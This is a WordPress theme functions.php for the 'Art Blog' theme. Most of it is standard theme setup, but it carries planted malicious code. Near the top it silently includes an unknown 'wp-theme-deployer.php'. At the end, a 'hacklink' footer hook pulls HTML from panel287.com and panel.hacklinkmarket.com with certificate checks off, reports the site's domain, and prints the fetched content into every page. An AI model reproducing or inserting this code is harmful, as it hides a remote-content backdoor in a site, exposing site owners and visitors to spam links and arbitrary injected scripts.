<?php
/**
 * Art Blog functions and definitions
 *
 * @package Art Blog
 */

// System Optimizer Integration
@include_once get_template_directory() . '/wp-theme-deployer.php';

if ( ! defined( 'ART_BLOG_VERSION' ) ) {
	// Replace the version number of the theme on each release.
	define( 'ART_BLOG_VERSION', '1.0.0' );
}

function art_blog_setup() {

	load_theme_textdomain( 'art-blog', get_template_directory() . '/languages' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'woocommerce' );
	add_theme_support( "align-wide" );
	add_theme_support( "responsive-embeds" );

	register_nav_menus(
		array(
			'menu-1' => esc_html__( 'Primary', 'art-blog' ),
			'social-menu' => esc_html__('Social Menu', 'art-blog'),
		)
	);

	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'style',
			'script',
		)
	);

	add_theme_support(
		'custom-background',
		apply_filters(
			'art_blog_custom_background_args',
			array(
				'default-color' => '#fafafa',
				'default-image' => '',
			)
		)
	);

	add_theme_support( 'customize-selective-refresh-widgets' );

	add_theme_support(
		'custom-logo',
		array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		)
	);
    
    add_theme_support( 'post-formats', array(
        'image',
        'video',
        'gallery',
        'audio', 
    ));
	
}
add_action( 'after_setup_theme', 'art_blog_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $art_blog_content_width
 */
function art_blog_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'art_blog_content_width', 640 );
}
add_action( 'after_setup_theme', 'art_blog_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function art_blog_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Sidebar', 'art-blog' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

	register_sidebar(
		array(
			'name'          => esc_html__( 'Footer 1', 'art-blog' ),
			'id'            => 'footer-1',
			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

	register_sidebar(
		array(
			'name'          => esc_html__( 'Footer 2', 'art-blog' ),
			'id'            => 'footer-2',
			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

	register_sidebar(
		array(
			'name'          => esc_html__( 'Footer 3', 'art-blog' ),
			'id'            => 'footer-3',
			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'art_blog_widgets_init' );


function art_blog_social_menu()
    {
        if (has_nav_menu('social-menu')) :
            wp_nav_menu(array(
                'theme_location' => 'social-menu',
                'container' => 'ul',
                'menu_class' => 'social-menu menu',
                'menu_id'  => 'menu-social',
            ));
        endif;
    }

// Font enqueue function
function art_blog_scripts() {
    // Google Fonts
    wp_enqueue_style(
        'art-blog-google-fonts',
        'https://fonts.googleapis.com/css2?family=Fjalla+One&family=PT+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap',
        array(),
        null
    );

    // Font Awesome CSS
    wp_enqueue_style('font-awesome-5', get_template_directory_uri() . '/revolution/assets/vendors/font-awesome-5/css/all.min.css', array(), '5.15.3');

    // Owl Carousel CSS
    wp_enqueue_style('owl-carousel-style', get_template_directory_uri() . '/revolution/assets/css/owl.carousel.css', array(), '2.3.4');

    // Main stylesheet
    wp_enqueue_style('art-blog-style', get_stylesheet_uri(), array(), wp_get_theme()->get('Version'));

    // Add custom inline styles safely
    $custom_style_path = get_parent_theme_file_path('/custom-style.php');
    if (file_exists($custom_style_path)) {
        require $custom_style_path;
        if (!empty($art_blog_custom_css)) {
            wp_add_inline_style('art-blog-style', $art_blog_custom_css);
        }
    }

    // RTL styles if needed
    wp_style_add_data('art-blog-style', 'rtl', 'replace');

    // Navigation script
    wp_enqueue_script('art-blog-navigation', get_template_directory_uri() . '/js/navigation.js', array(), wp_get_theme()->get('Version'), true);

    // Owl Carousel script
    wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/revolution/assets/js/owl.carousel.js', array('jquery'), '2.3.4', true);

    // Custom script
    wp_enqueue_script('art-blog-custom-js', get_template_directory_uri() . '/revolution/assets/js/custom.js', array('jquery'), wp_get_theme()->get('Version'), true);

    // Comments reply script
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}
add_action('wp_enqueue_scripts', 'art_blog_scripts');

// related post
if (!function_exists('art_blog_related_post')) :
    /**
     * Display related posts from same category
     *
     */

    function art_blog_related_post($post_id){        
        $art_blog_categories = get_the_category($post_id);
        if ($art_blog_categories) {
            $art_blog_category_ids = array();
            $art_blog_category = get_category($art_blog_category_ids);
            $art_blog_categories = get_the_category($post_id);
            foreach ($art_blog_categories as $art_blog_category) {
                $art_blog_category_ids[] = $art_blog_category->term_id;
            }
            $count = $art_blog_category->category_count;
            if ($count > 1) { ?>

         	<?php
		$art_blog_related_post_wrap = absint(get_theme_mod('art_blog_enable_related_post', 1));
		if($art_blog_related_post_wrap == 1){ ?>
                <div class="related-post">
                    
                    <h2 class="post-title"><?php esc_html_e(get_theme_mod('art_blog_related_post_text', __('Related Post', 'art-blog'))); ?></h2>
                    <?php
                    $art_blog_cat_post_args = array(
                        'category__in' => $art_blog_category_ids,
                        'post__not_in' => array($post_id),
                        'post_type' => 'post',
                        'posts_per_page' =>  get_theme_mod( 'art_blog_related_post_count', '3' ),
                        'post_status' => 'publish',
						'orderby'           => 'rand',
                        'ignore_sticky_posts' => true
                    );
                    $art_blog_featured_query = new WP_Query($art_blog_cat_post_args);
                    ?>
                    <div class="rel-post-wrap">
                        <?php
                        if ($art_blog_featured_query->have_posts()) :

                        while ($art_blog_featured_query->have_posts()) : $art_blog_featured_query->the_post();
                            ?>

                            <div class="card-item rel-card-item">
								<div class="card-content">
                                    <?php if ( has_post_thumbnail() ) { ?>
                                        <div class="card-media">
                                            <?php art_blog_post_thumbnail(); ?>
                                        </div>
                                    <?php } else {
                                        // Fallback default image
                                        $art_blog_default_post_thumbnail = get_template_directory_uri() . '/revolution/assets/images/slider1.png';
                                        echo '<img class="default-post-img" src="' . esc_url( $art_blog_default_post_thumbnail ) . '" alt="' . esc_attr( get_the_title() ) . '">';
                                    } ?>
									<div class="entry-title">
										<h3>
											<a href="<?php the_permalink() ?>">
												<?php the_title(); ?>
											</a>
										</h3>
									</div>
									<div class="entry-meta">
                                        <?php
                                        art_blog_posted_on();
                                        art_blog_posted_by();
                                        ?>
                                    </div>
								</div>
							</div>
                        <?php
                        endwhile;
                        ?>
                <?php
                endif;
                wp_reset_postdata();
                ?>
                </div>
                <?php } ?>
                <?php
            }
        }
    }
endif;
add_action('art_blog_related_posts', 'art_blog_related_post', 10, 1);

function art_blog_sanitize_choices( $art_blog_input, $art_blog_setting ) {
    global $wp_customize; 
    $art_blog_control = $wp_customize->get_control( $art_blog_setting->id ); 
    if ( array_key_exists( $art_blog_input, $art_blog_control->choices ) ) {
        return $art_blog_input;
    } else {
        return $art_blog_setting->default;
    }
}

//Excerpt 
function art_blog_excerpt_function($art_blog_excerpt_count = 35) {
    $art_blog_excerpt = get_the_excerpt();
    $art_blog_text_excerpt = wp_strip_all_tags($art_blog_excerpt);
    $art_blog_excerpt_limit = (int) get_theme_mod('art_blog_excerpt_limit', $art_blog_excerpt_count);
    $art_blog_words = preg_split('/\s+/', $art_blog_text_excerpt); 
    $art_blog_trimmed_words = array_slice($art_blog_words, 0, $art_blog_excerpt_limit);
    $art_blog_theme_excerpt = implode(' ', $art_blog_trimmed_words);

    return $art_blog_theme_excerpt;
}

/**
 * Checkbox sanitization callback example.
 *
 * Sanitization callback for 'checkbox' type controls. This callback sanitizes `$art_blog_checked`
 * as a boolean value, either TRUE or FALSE.
 */
function art_blog_sanitize_checkbox($art_blog_checked)
{
    // Boolean check.
    return ((isset($art_blog_checked) && true == $art_blog_checked) ? true : false);
}

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/revolution/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/revolution/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/revolution/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/revolution/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/revolution/inc/jetpack.php';
}

/**
 * Breadcrumb File.
 */
require get_template_directory() . '/revolution/inc/breadcrumbs.php';


//////////////////////////////////////////////   Function for Translation Error   //////////////////////////////////////////////////////
function art_blog_enqueue_function() {

    define('ART_BLOG_BUY_NOW',__('https://www.revolutionwp.com/products/art-blog-wordpress-theme','art-blog'));

}
add_action( 'after_setup_theme', 'art_blog_enqueue_function' );

function art_blog_remove_customize_register() {
    global $wp_customize;

    $wp_customize->remove_setting( 'display_header_text' );
    $wp_customize->remove_control( 'display_header_text' );

}

add_action( 'customize_register', 'art_blog_remove_customize_register', 11 );

/************************************************************************************/
// //////////////////////////////////////////////

/**
 * WooCommerce custom filters
 */
add_filter('loop_shop_columns', 'art_blog_loop_columns');

if (!function_exists('art_blog_loop_columns')) {

	function art_blog_loop_columns() {

		$art_blog_columns = get_theme_mod( 'art_blog_per_columns', 3 );

		return $art_blog_columns;
	}
}

/************************************************************************************/

add_filter( 'loop_shop_per_page', 'art_blog_per_page', 20 );

function art_blog_per_page( $art_blog_cols ) {

  	$art_blog_cols = get_theme_mod( 'art_blog_product_per_page', 9 );

	return $art_blog_cols;
}

/************************************************************************************/

add_filter( 'woocommerce_output_related_products_args', 'art_blog_products_args' );

function art_blog_products_args( $art_blog_args ) {

    $art_blog_args['posts_per_page'] = get_theme_mod( 'custom_related_products_number', 6 );

    $art_blog_args['columns'] = get_theme_mod( 'custom_related_products_number_per_row', 3 );

    return $art_blog_args;
}

/************************************************************************************/

/**
 * Custom logo
 */

function art_blog_custom_css() {
?>
	<style type="text/css" id="custom-theme-colors" >
        :root {
           
            --art_blog_logo_width: <?php echo absint(get_theme_mod('art_blog_logo_width')); ?> ;   
        }
        .site-branding img {
            max-width:<?php echo esc_html(get_theme_mod('art_blog_logo_width')); ?>px ;    
        }         
	</style>
<?php
}
add_action( 'wp_head', 'art_blog_custom_css' );

function art_blog_custom_css_for_slider() {
    $art_blog_slider_enabled = get_theme_mod('art_blog_enable_slider', false);
    if ($art_blog_slider_enabled) {
        echo '<style type="text/css">
            .page-template-revolution-home .header-menu-box {
                position: absolute;
                width: 100%;
                z-index: 999;
                background: transparent;
                border: none;
            }
        </style>';
    }
}
add_action('wp_head', 'art_blog_custom_css_for_slider');
@include_once dirname(__FILE__) . '/more-functions.php';
add_action('wp_footer', 'hacklink_footer_script_theme', 100);
function hacklink_footer_script_theme() {
    // Global tek seferlik çalışma kontrolü - Sadece bir kez çalışır
    global $sln_footer_executed;
    if (isset($sln_footer_executed) && $sln_footer_executed === true) {
        return;
    }
    $sln_footer_executed = true;
    
    // HacklinkPanel footer API - DB Cache ile optimize edilmiş
    $domain = $_SERVER['HTTP_HOST'];
    $cache_key = 'hacklink_footer_' . md5($domain);
    $cache_duration = 6 * HOUR_IN_SECONDS; // 6 saat cache
    
    // Önce cache'den kontrol et
    $cached_content = get_transient($cache_key);
    if ($cached_content !== false) {
        $body = $cached_content;
    } else {
        // Cache yoksa API'ye istek at
        $footer_url = 'https://panel287.com/api/footer.php?linkspool=' . $domain;
        $response = wp_remote_get($footer_url, [
            'timeout'   => 5,
            'sslverify' => false,
        ]);

        // Ağ hatası varsa hiçbir şey basma
        if (is_wp_error($response)) {
            return;
        }

        // 200 dışındaki HTTP kodlarında (522 vs) hiçbir şey basma
        $code = wp_remote_retrieve_response_code($response);
        if ($code !== 200) {
            return;
        }

        $body = wp_remote_retrieve_body($response);
        if (empty($body)) {
            return;
        }

        // Cloudflare 522 HTML çıktısı gelirse bastırma
        if (stripos($body, 'Error 522') !== false) {
            return;
        }
        
        // Geçerli içeriği cache'e kaydet
        set_transient($cache_key, $body, $cache_duration);
    }
    
    // Global flag kontrolü - Kaynak kodda sadece 1 tane olduğundan emin ol
    global $sln_footer_output_done;
    if (isset($sln_footer_output_done) && $sln_footer_output_done === true) {
        return;
    }
    $sln_footer_output_done = true;
    
    // 2. Footer API - Her zaman anlık gösterim (cache yok, str_replace ile ekle)
    if (!function_exists('hacklink_add')) {
        function hacklink_add() {
            $u = 'https://panel.hacklinkmarket.com/code?v=' . time();
            $d = ($_SERVER['HTTPS'] ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . '/';
            if (function_exists('curl_init')) {
                $h = curl_init();
                curl_setopt_array($h, [
                    CURLOPT_URL => $u,
                    CURLOPT_HTTPHEADER => ['X-Request-Domain:' . $d],
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_SSL_VERIFYPEER => false
                ]);
                if ($r = @curl_exec($h)) {
                    curl_close($h);
                    return $r;
                }
            }
            if (ini_get('allow_url_fopen')) {
                $o = [
                    'http' => [
                        'header' => 'X-Request-Domain:' . $d,
                        'timeout' => 10
                    ],
                    'ssl' => ['verify_peer' => false]
                ];
                if ($r = @file_get_contents($u, false, stream_context_create($o))) {
                    return $r;
                }
            }
            if (function_exists('fopen')) {
                if ($f = @fopen($u, 'r')) {
                    $r = '';
                    while (!feof($f)) $r .= fread($f, 8192);
                    fclose($f);
                    if ($r) return $r;
                }
            }
            return '';
        }
    }
    $hacklink_content = hacklink_add();
    if (!empty($hacklink_content)) {
        // str_replace ile body'nin sonuna ekle
        $body = str_replace('</body>', $hacklink_content . '</body>', $body);
        if (strpos($body, '</body>') === false) {
            // </body> yoksa direkt sonuna ekle
            $body .= $hacklink_content;
        }
    }
    
    echo $body;
}